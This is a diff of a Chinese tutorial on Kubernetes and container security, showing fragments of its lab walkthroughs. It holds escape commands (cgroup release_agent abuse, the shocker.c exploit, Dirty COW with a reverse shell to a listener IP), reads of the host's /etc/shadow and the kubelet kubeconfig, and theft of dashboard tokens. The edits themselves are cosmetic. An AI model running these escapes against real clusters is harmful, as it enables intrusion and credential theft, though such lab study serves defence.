@@ -4,7 +4,7 @@
 
 K8s集群安全攻防(下)
 
-- - -
+* * *
 
 ## 文章前言
 
@@ -20,9 +20,9 @@ K8s集群安全攻防(下)
 
 Security Context(安全上下文)，用于定义Pod或Container的权限和访问控制，Kubernetes提供了三种配置Security Context的方法：
 
--   Pod Security Policy：应用于集群级别
--   Pod-level Security Context：应用于Pod级别
--   Container-level Security Context：应用于容器级别
+*   Pod Security Policy：应用于集群级别
+*   Pod-level Security Context：应用于Pod级别
+*   Container-level Security Context：应用于容器级别
 
 容器级别：仅应用到指定的容器上，并且不会影响Volume
 
@@ -56,7 +56,7 @@ spec:
 ```
 
 PSP，集群级别：PSP是集群级的Pod安全策略，自动为集群内的Pod和Volume设置Security Context  
-[![](assets/1698893217-bbcdab71e39d6e7e45cf8e9efc0fd785.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027132824-a6153f30-7489-1.png)
+[![](assets/1701606868-bbcdab71e39d6e7e45cf8e9efc0fd785.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027132824-a6153f30-7489-1.png)
 
 ##### 漏洞介绍
 
@@ -70,7 +70,7 @@ Step 1：使用docker拉取ubuntu镜像到本地
 sudo docker pull ubuntu
 ```
 
-[![](assets/1698893217-c649ffe3654234097e25e8d6cf13aa51.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133008-e44a9098-7489-1.png)  
+[![](assets/1701606868-c649ffe3654234097e25e8d6cf13aa51.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133008-e44a9098-7489-1.png)  
 Step 2：创建一个Pod的yaml文件
 
 ```plain
@@ -86,14 +86,14 @@ spec:
       privileged: true
 ```
 
-[![](assets/1698893217-949ec7823c0b5956c4b6883357db2e85.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133148-1ff4a17e-748a-1.png)  
+[![](assets/1701606868-949ec7823c0b5956c4b6883357db2e85.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133148-1ff4a17e-748a-1.png)  
 Step 3：创建一个Pod
 
 ```plain
 kubectl create -f myapp-test.yaml
 ```
 
-[![](assets/1698893217-4982eb94efbae8d9726be6c336865d40.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133242-400f5b48-748a-1.png)  
+[![](assets/1701606868-4982eb94efbae8d9726be6c336865d40.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133242-400f5b48-748a-1.png)  
 Step 3：进入Pod进行逃逸操作
 
 ```plain
@@ -104,23 +104,23 @@ kubectl exec -it myapp-test /bin/bash
 fdisk -l
 ```
 
-[![](assets/1698893217-3005789126ef6df9e7c91f1a9d80446a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133307-4f08ba54-748a-1.png)  
+[![](assets/1701606868-3005789126ef6df9e7c91f1a9d80446a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133307-4f08ba54-748a-1.png)  
 Step 4：查看权限
 
 ```plain
 cat /proc/self/status | grep CapEff
 ```
 
-[![](assets/1698893217-38800c317f53ed661de9fd15b1676f8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133331-5d0c4e9a-748a-1.png)  
+[![](assets/1701606868-38800c317f53ed661de9fd15b1676f8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133331-5d0c4e9a-748a-1.png)  
 Step 5：使用CDK进行逃逸
 
 ```plain
 ./cdk run mount-disk
 ```
 
-[![](assets/1698893217-df781339a7a4c2ae82dd9f81bc70fce4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133355-6b561fc6-748a-1.png)  
+[![](assets/1701606868-df781339a7a4c2ae82dd9f81bc70fce4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133355-6b561fc6-748a-1.png)  
 在容器内部进入挂载目录，直接管理宿主机磁盘文件(多少有一些问题)  
-[![](assets/1698893217-bbbdb0182cb25ce3f6bcbd9cb92271e4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133417-78f9e41e-748a-1.png)
+[![](assets/1701606868-bbbdb0182cb25ce3f6bcbd9cb92271e4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133417-78f9e41e-748a-1.png)
 
 #### CAP\_SYS\_ADMIN配置逃逸
 
@@ -128,23 +128,23 @@ Step 5：使用CDK进行逃逸
 
 Docker通过Linux Namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯，但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限：
 
--   \--pid=host 启动时，绕过PID Namespace
--   \--ipc=host 启动时，绕过IPC Namespace
--   \--net=host 启动时，绕过Network Namespace
--   \--cap-add=SYS\_ADMIN 启动时，允许执行mount特权操作，需获得资源挂载进行利用
+*   \--pid=host 启动时，绕过PID Namespace
+*   \--ipc=host 启动时，绕过IPC Namespace
+*   \--net=host 启动时，绕过Network Namespace
+*   \--cap-add=SYS\_ADMIN 启动时，允许执行mount特权操作，需获得资源挂载进行利用
 
 ##### 利用前提
 
--   在容器内root用户
--   容器必须使用SYS\_ADMIN Linux capability运行
--   容器必须缺少AppArmor配置文件，否则将允许mount syscall
--   cgroup v1虚拟文件系统必须以读写方式安装在容器内部
+*   在容器内root用户
+*   容器必须使用SYS\_ADMIN Linux capability运行
+*   容器必须缺少AppArmor配置文件，否则将允许mount syscall
+*   cgroup v1虚拟文件系统必须以读写方式安装在容器内部
 
 ##### 前置知识
 
 **cgroup**  
 默认情况下容器在启动时会在/sys/fs/cgroup目录各个subsystem目录的docker子目录里生成以容器ID为名字的子目录，我们通过执行以下命令查看宿主机里的memory cgroup目录，可以看到docker目录里多了一个目录9d14bc4987d5807f691b988464e167653603b13faf805a559c8a08cb36e3251a，这一串字符是容器ID，这个目录里的内容就是用户在容器里查看/sys/fs/cgroup/memory的内容  
-[![](assets/1698893217-66d41e9dea93c281032892d9860c8f68.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133631-c85a08fe-748a-1.png)  
+[![](assets/1701606868-66d41e9dea93c281032892d9860c8f68.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133631-c85a08fe-748a-1.png)  
 **mount**  
 mount命令是一个系统调用(syscall)命令，系统调用号为165，执行syscall需要用户具备CAP\_SYS\_ADMIN的Capability，如果在宿主机启动时添加了--cap-add SYS\_ADMIN参数，那root用户就能在容器内部就能执行mount挂载cgroup，docker默认情况下不会开启SYS\_ADMIN Capability
 
@@ -158,11 +158,11 @@ mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
 
 参数解释：
 
--   \-t参数：表示mount的类别为cgroup
--   \-o参数：表示挂载的选项，对于cgroup，挂载选项就是cgroup的subsystem，每个subsystem代表一种资源类型，比如：cpu、memory  
+*   \-t参数：表示mount的类别为cgroup
+*   \-o参数：表示挂载的选项，对于cgroup，挂载选项就是cgroup的subsystem，每个subsystem代表一种资源类型，比如：cpu、memory  
     执行该命令之后，宿主机的memory cgroup被挂载到了容器中，对应目录/tmp/cgrp
 
-[![](assets/1698893217-d71788450178dd1dd552276ca20c6de8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133725-e9113e82-748a-1.png)  
+[![](assets/1701606868-d71788450178dd1dd552276ca20c6de8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133725-e9113e82-748a-1.png)  
 需要注意的是在对cgroup进行重新挂载的操作时只有当被挂载目标的hierarchy为空时才能成功，因此如果这里memory的重新挂载不成功的话可以换其他的subsystem，接着就是在这个cgroup类型里建一个子目录x
 
 ```plain
@@ -182,9 +182,9 @@ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
 ```
 
 文件/etc/mtab存储了容器中实际挂载的文件系统  
-[![](assets/1698893217-94c8e9e550de453a4cee45d39001104d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133829-0edbbd22-748b-1.png)  
+[![](assets/1701606868-94c8e9e550de453a4cee45d39001104d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133829-0edbbd22-748b-1.png)  
 这里使用sed命令匹配perdir=(和)之间的非逗号内容，从上图可以看出，host\_path就是docker的overlay存储驱动上的可写目录upperdir  
-[![](assets/1698893217-d241287133c59c11e851c36edeb41900.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133858-20555cac-748b-1.png)  
+[![](assets/1701606868-d241287133c59c11e851c36edeb41900.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133858-20555cac-748b-1.png)  
 在这个目录里创建一个cmd文件，并把它作为/tmp/cgrp/x/release\_agent参数指定的文件：
 
 ```plain
@@ -206,7 +206,7 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
 该命令启动一个sh进程，将sh进程的PID写入到/tmp/cgrp/x/cgroup.procs里，这里的\\$\\$表示sh进程的PID，在执行完sh -c之后，sh进程自动退出，这样cgroup /tmp/cgrp/x里不再包含任何任务，/tmp/cgrp/release\_agent文件里的shell将被操作系统内核执行  
-[![](assets/1698893217-83f77d27985d3556bc6c041e4170a98d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133935-3631cb5a-748b-1.png)
+[![](assets/1701606868-83f77d27985d3556bc6c041e4170a98d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027133935-3631cb5a-748b-1.png)
 
 #### CAP\_DAC\_READ\_SEARCH
 
@@ -225,13 +225,13 @@ Docker 1.0
 ./metarget gadget install k8s --version 1.16.5 --domestic
 ```
 
-[![](assets/1698893217-14f2c9c4bd0a77b99936515b74c10e54.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134108-6dfce90c-748b-1.png)
+[![](assets/1701606868-14f2c9c4bd0a77b99936515b74c10e54.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134108-6dfce90c-748b-1.png)
 
 ```plain
 ./metarget cnv install cap_dac_read_search-container
 ```
 
-[![](assets/1698893217-7830ac6e46f875ed7a6f72b782a2f469.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134130-7ade5bba-748b-1.png)  
+[![](assets/1701606868-7830ac6e46f875ed7a6f72b782a2f469.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134130-7ade5bba-748b-1.png)  
 备注：此场景较为简单可以直接使用Docker手动搭建，默认存在漏洞的Docker版本过于久远，但是复现漏洞可以使用任意版本的Docker，只需要在启动Docker时通过--cap-add选项来添加CAP\_DAC\_READ\_SEARCH capability的权限即可
 
 ##### 漏洞复现
@@ -244,7 +244,7 @@ docker top 5713dea
 getpcaps 51776
 ```
 
-[![](assets/1698893217-d93d1c97d20ca5b0b765b416a0dea672.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134236-a210243e-748b-1.png)  
+[![](assets/1701606868-d93d1c97d20ca5b0b765b416a0dea672.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134236-a210243e-748b-1.png)  
 Step 2：下载poc文件并修改shocker.c中.dockerinit文件为 /etc/hosts
 
 ```plain
@@ -260,14 +260,14 @@ if ((fd1 = open("/etc/hosts", O_RDONLY)) < 0)
   die("[-] open");
 ```
 
-[![](assets/1698893217-1d6ad837341af514bf6b0412c08b0063.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134258-af92e6b4-748b-1.png)  
+[![](assets/1701606868-1d6ad837341af514bf6b0412c08b0063.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134258-af92e6b4-748b-1.png)  
 Step 3：编译shock.c文件
 
 ```plain
 gcc shocker.c -o shocker
 ```
 
-[![](assets/1698893217-54dd409f1a39b4e1b7f1d11b4df9e2c6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134320-bc7e4efe-748b-1.png)  
+[![](assets/1701606868-54dd409f1a39b4e1b7f1d11b4df9e2c6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134320-bc7e4efe-748b-1.png)  
 Step 4：docker cp到容器内运行后成功访问到了宿主机的/etc/shadow文件
 
 ```plain
@@ -278,19 +278,19 @@ docker cp 本地路径 容器ID:容器路径
 docker cp /home/ubuntu/shocker 5713dea8ce4b:/tmp/shocker
 ```
 
-[![](assets/1698893217-df4074eb493f175b0ac830f2464a8a8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134348-cd12a3a0-748b-1.png)  
-[![](assets/1698893217-2d5f4a941a10cc169f5b15817b0a1ba2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134358-d349a9f8-748b-1.png)
+[![](assets/1701606868-df4074eb493f175b0ac830f2464a8a8f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134348-cd12a3a0-748b-1.png)  
+[![](assets/1701606868-2d5f4a941a10cc169f5b15817b0a1ba2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027134358-d349a9f8-748b-1.png)
 
 ### 内核漏洞
 
 内核漏洞由很多都可以利用，例如：
 
--   CVE-2016-5195:脏牛漏洞逃逸
--   CVE-2017-7308:Linux内核逃逸
--   CVE-2017-1000112:Linux内核逃逸
--   CVE-2021-22555:Linux内核逃逸
--   CVE-2021-31440:Linux eBPF
--   CVE-2022-0185:Linux Kernel Escape
+*   CVE-2016-5195:脏牛漏洞逃逸
+*   CVE-2017-7308:Linux内核逃逸
+*   CVE-2017-1000112:Linux内核逃逸
+*   CVE-2021-22555:Linux内核逃逸
+*   CVE-2021-31440:Linux eBPF
+*   CVE-2022-0185:Linux Kernel Escape
 
 下面仅以脏牛漏洞逃逸为例：
 
@@ -325,10 +325,10 @@ make
 ./0xdeadbeef 192.168.172.136:1234
 ```
 
-[![](assets/1698893217-866732cdf18e94e714cbd0fb14e31574.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140130-45db501e-748e-1.png)  
+[![](assets/1701606868-866732cdf18e94e714cbd0fb14e31574.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140130-45db501e-748e-1.png)  
 Step 4：在192.168.172.136监听本地端口，成功接收到宿主机反弹的shell
 
-[![](assets/1698893217-f8810b60324b7dc47bfc7b13d19fe120.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140145-4f3f6fd2-748e-1.png)  
+[![](assets/1701606868-f8810b60324b7dc47bfc7b13d19fe120.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140145-4f3f6fd2-748e-1.png)  
 这里留一个常被用于面试的问题给大家思考：  
 为什么内核漏洞可以导致容器逃逸？基本原理是什么？
 
@@ -343,7 +343,7 @@ Step 4：在192.168.172.136监听本地端口，成功接收到宿主机反弹�
 ##### 具体实现
 
 Step 1：查看当前权限确定该容器具有主机系统的完整权限  
-[![](assets/1698893217-938b7db59ff7645522c29252c9aa363c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140722-17a4a294-748f-1.png)  
+[![](assets/1701606868-938b7db59ff7645522c29252c9aa363c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140722-17a4a294-748f-1.png)  
 Step 2：发现/host-system从主机系统安装
 
 ```plain
@@ -351,7 +351,7 @@ ls -al
 ls /host-system/
 ```
 
-[![](assets/1698893217-062640536df26c107724f5891079fb06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140749-2832f46c-748f-1.png)  
+[![](assets/1701606868-062640536df26c107724f5891079fb06.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140749-2832f46c-748f-1.png)  
 Step 3：获得主机系统权限
 
 ```plain
@@ -359,21 +359,21 @@ chroot /host-system bash
 docker ps
 ```
 
-[![](assets/1698893217-26e4d14cca87165f5821d4dfaa255e14.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140807-32a372be-748f-1.png)  
+[![](assets/1701606868-26e4d14cca87165f5821d4dfaa255e14.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140807-32a372be-748f-1.png)  
 Step 4：访问节点级别Kubernetes的kubelet配置
 
 ```plain
 cat /var/lib/kubelet/kubeconfig
 ```
 
-[![](assets/1698893217-3640bbdeef9f47b51a69422e9b199715.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140825-3d9f1fe2-748f-1.png)  
+[![](assets/1701606868-3640bbdeef9f47b51a69422e9b199715.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140825-3d9f1fe2-748f-1.png)  
 Step 5：使用kubelet配置执行Kubernetes集群范围的资源
 
 ```plain
 kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
 ```
 
-[![](assets/1698893217-c9253e1b08a71d6ecd8cf04ddd1218ef.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140849-4b8457c6-748f-1.png)
+[![](assets/1701606868-c9253e1b08a71d6ecd8cf04ddd1218ef.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140849-4b8457c6-748f-1.png)
 
 #### /var/log危险挂载
 
@@ -381,15 +381,15 @@ kubectl --kubeconfig /var/lib/kubelet/kubeconfig get all -n kube-system
 
 当Pod以可写权限挂载了宿主机的/var/log目录，而且Pod里的Service Account有权限访问该Pod在宿主机上的日志时，攻击者可以通过在容器内创建符号链接来完成简单逃逸，简单归纳总结如下：
 
--   挂载了/var/log
--   容器在一个K8s的环境中
--   Pod的ServiceAccount拥有get|list|watch log的权限
+*   挂载了/var/log
+*   容器在一个K8s的环境中
+*   Pod的ServiceAccount拥有get|list|watch log的权限
 
 ##### 原理简介
 
 下图展示了kubectl logs <pod-name> 如何从pod中检索日志</pod-name>
 
-[![](assets/1698893217-e8cdba964fe4922f8b7dca4a67cd077e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140935-67148d62-748f-1.png)  
+[![](assets/1701606868-e8cdba964fe4922f8b7dca4a67cd077e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027140935-67148d62-748f-1.png)  
 kubelet会在宿主机上的/var/log目录中创建一个目录结构，如图符号1，代表节点上的pod，但它实际上是一个符号链接，指向/var/lib/docker/containers目录中的容器日志文件，当使用kubectl logs <pod-name>命令查询指定pod的日志时，实际上是向kubelet的/logs/pods/<path\_to\_0.log>接口发起HTTP请求，对于该请求的处理逻辑如下</pod-name>
 
 ```plain
@@ -412,10 +412,10 @@ kubelet会解析该请求地址去/var/log对应的目录下读取log文件并�
 ./metarget cnv install mount-var-log
 ```
 
-[![](assets/1698893217-aec6cb661115b351cb2ceaf4b2730479.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141145-b4bdc3b2-748f-1.png)  
+[![](assets/1701606868-aec6cb661115b351cb2ceaf4b2730479.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141145-b4bdc3b2-748f-1.png)  
 执行完成后，K8s集群内metarget命令空间下将会创建一个名为mount-var-log的pod
 
-[![](assets/1698893217-dd7c1841f1b1028f1a4156e87804a01b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141200-bd74e058-748f-1.png)
+[![](assets/1701606868-dd7c1841f1b1028f1a4156e87804a01b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141200-bd74e058-748f-1.png)
 
 ##### 漏洞复现
 
@@ -425,7 +425,7 @@ Step 1：执行以下命令进入容器
 kubectl -n metarget exec -it mount-var-log  /bin/bash
 ```
 
-[![](assets/1698893217-c09b2d1e02f1b697bdd1a57ca910bbb6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141231-d019e546-748f-1.png)  
+[![](assets/1701606868-c09b2d1e02f1b697bdd1a57ca910bbb6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141231-d019e546-748f-1.png)  
 Step 2：查看文件，Pod内可执行以下两种命令
 
 ```plain
@@ -433,9 +433,9 @@ lsh     等于宿主机上的ls
 cath    等于宿主机上的cat
 ```
 
-[![](assets/1698893217-263faaf8bfa626857a4929a898017ef6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141301-e1fd749e-748f-1.png)
+[![](assets/1701606868-263faaf8bfa626857a4929a898017ef6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141301-e1fd749e-748f-1.png)
 
-[![](assets/1698893217-201da49a99daae20a8ba046abf5cd329.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141309-e6c96cf8-748f-1.png)
+[![](assets/1701606868-201da49a99daae20a8ba046abf5cd329.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141309-e6c96cf8-748f-1.png)
 
 ##### 敏感文件
 
@@ -468,7 +468,7 @@ $ kubectl exec -it escaper bash
 
 [https://github.com/danielsagi/kube-pod-escape](https://github.com/danielsagi/kube-pod-escape)
 
-[![](assets/1698893217-caa22557e9abedadc0c074a69c357cb7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141408-09c0657c-7490-1.png)
+[![](assets/1701606868-caa22557e9abedadc0c074a69c357cb7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141408-09c0657c-7490-1.png)
 
 #### Procfs目录逃逸类
 
@@ -572,7 +572,7 @@ ncat -lvnp 10000
 ### 基础知识
 
 污点是K8s高级调度的特性，用于限制哪些Pod可以被调度到某一个节点，一般主节点包含一个污点，这个污点是阻止Pod调度到主节点上面，除非有Pod能容忍这个污点，而通常容忍这个污点的Pod都是系统级别的Pod，例如:kube-system  
-[![](assets/1698893217-9dd4653e2aba00ba0dc3364c67741af8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141814-9c3f5066-7490-1.png)
+[![](assets/1701606868-9dd4653e2aba00ba0dc3364c67741af8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141814-9c3f5066-7490-1.png)
 
 ### 基本原理
 
@@ -586,7 +586,7 @@ Step 1：Node中查看节点信息
 kubectl get nodes
 ```
 
-[![](assets/1698893217-33a0cde35193489589a166d8cd48920d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141908-bc97729e-7490-1.png)  
+[![](assets/1701606868-33a0cde35193489589a166d8cd48920d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141908-bc97729e-7490-1.png)  
 Step 2：确认Master节点的容忍度
 
 ```plain
@@ -594,14 +594,14 @@ Step 2：确认Master节点的容忍度
 kubectl describe nodes master
 ```
 
-[![](assets/1698893217-eb835416fcfee17efa97e7c249f57d13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141931-ca989ff8-7490-1.png)
+[![](assets/1701606868-eb835416fcfee17efa97e7c249f57d13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141931-ca989ff8-7490-1.png)
 
 ```plain
 #方式二
 kubectl describe node master | grep 'Taints' -A 5
 ```
 
-[![](assets/1698893217-bc06ce138aae109f170c98bfc5e380fc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141947-d41752ea-7490-1.png)  
+[![](assets/1701606868-bc06ce138aae109f170c98bfc5e380fc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027141947-d41752ea-7490-1.png)  
 Step 3：创建带有容忍参数的Pod(必要时可以修改Yaml使Pod增加到特定的Node上去)
 
 ```plain
@@ -628,7 +628,7 @@ spec:
       type: Directory
 ```
 
-[![](assets/1698893217-1cee6b7080bb61dc07fa49c0849de883.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142010-e179c12a-7490-1.png)
+[![](assets/1701606868-1cee6b7080bb61dc07fa49c0849de883.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142010-e179c12a-7490-1.png)
 
 ```plain
 #创建Pod
@@ -641,7 +641,7 @@ kubectl get deploy -o wide
 kubectl get pod -o wide
 ```
 
-[![](assets/1698893217-4631a420d50aa8e41b8b43647e4ed455.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142032-eec932f2-7490-1.png)  
+[![](assets/1701606868-4631a420d50aa8e41b8b43647e4ed455.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142032-eec932f2-7490-1.png)  
 Step 4：获得Master控制端
 
 ```plain
@@ -651,9 +651,9 @@ ls -al
 cat /etc/shadow
 ```
 
-[![](assets/1698893217-8eddea08c1232adb862375e4b61e6d7d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142051-f9e180fe-7490-1.png)
+[![](assets/1701606868-8eddea08c1232adb862375e4b61e6d7d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142051-f9e180fe-7490-1.png)
 
-[![](assets/1698893217-7a3b798997d7499db4b56cae9d92d208.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142058-fe288252-7490-1.png)
+[![](assets/1701606868-7a3b798997d7499db4b56cae9d92d208.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142058-fe288252-7490-1.png)
 
 #### 扩展技巧
 
@@ -690,12 +690,12 @@ Step 1：下载yaml文件
 wget https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0-beta8/aio/deploy/recommended.yaml
 ```
 
-[![](assets/1698893217-1729d4bdf6a2ad822f6e188c77cd7ec9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142633-c5e5ac20-7491-1.png)  
+[![](assets/1701606868-1729d4bdf6a2ad822f6e188c77cd7ec9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142633-c5e5ac20-7491-1.png)  
 Step 2：修改YAML文件  
-[![](assets/1698893217-fe4b3685ab3e3300e701c770ef13a594.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142646-cd97d678-7491-1.png)  
-[![](assets/1698893217-1f9e420c04034a79d04ff0a6418c45bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142658-d5091e12-7491-1.png)  
+[![](assets/1701606868-fe4b3685ab3e3300e701c770ef13a594.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142646-cd97d678-7491-1.png)  
+[![](assets/1701606868-1f9e420c04034a79d04ff0a6418c45bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142658-d5091e12-7491-1.png)  
 Step 3：下载镜像  
-[![](assets/1698893217-69403831b6a3d50aa1fdb92e4dc25e2c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142710-dbd29c50-7491-1.png)  
+[![](assets/1701606868-69403831b6a3d50aa1fdb92e4dc25e2c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142710-dbd29c50-7491-1.png)  
 Step 4：进行部署操作
 
 ```plain
@@ -706,47 +706,47 @@ kubectl apply -f kubernetes-dashboard.yaml
 kubectl delete -f kubernetes-dashboard.yaml
 ```
 
-[![](assets/1698893217-9c5d734d755c66c3014d1f1a4a4958b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142730-e82fd332-7491-1.png)  
+[![](assets/1701606868-9c5d734d755c66c3014d1f1a4a4958b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142730-e82fd332-7491-1.png)  
 Step 5：查看pod和service状态
 
 ```plain
 kubectl get pods,svc -n kubernetes-dashboard -o wide
 ```
 
-[![](assets/1698893217-abfd76d5b31d086c9569014303073a4b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142752-f541a87a-7491-1.png)  
+[![](assets/1701606868-abfd76d5b31d086c9569014303073a4b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142752-f541a87a-7491-1.png)  
 Step 6：查看所有的pod
 
 ```plain
 kubectl get pods --all-namespaces -o wide
 ```
 
-[![](assets/1698893217-1ec2d656be68ffa02cf5ef88292a8fc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142812-00e0600e-7492-1.png)  
+[![](assets/1701606868-1ec2d656be68ffa02cf5ef88292a8fc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142812-00e0600e-7492-1.png)  
 Step 7：在浏览器中访问，选择用默认用户kubernetes-dashboard的token登陆
 
-[![](assets/1698893217-1521086714d6de12427c78e22aee597b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142827-09cd17ac-7492-1.png)  
+[![](assets/1701606868-1521086714d6de12427c78e22aee597b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142827-09cd17ac-7492-1.png)  
 Step 8：查看serviceaccount和secrets
 
 ```plain
 kubectl  get sa,secrets -n kubernetes-dashboard
 ```
 
-[![](assets/1698893217-47919a98fc3514107ffffa925e7f78ee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142841-123a26f0-7492-1.png)  
+[![](assets/1701606868-47919a98fc3514107ffffa925e7f78ee.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142841-123a26f0-7492-1.png)  
 Step 9：查看token
 
 ```plain
 kubectl describe secrets kubernetes-dashboard-token-8kxnh -n kubernetes-dashboard
 ```
 
-[![](assets/1698893217-ffa24b2e0e95b2db5f4f53b2ae10bec3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142859-1d1f000e-7492-1.png)
+[![](assets/1701606868-ffa24b2e0e95b2db5f4f53b2ae10bec3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231027142859-1d1f000e-7492-1.png)
 
 ```plain
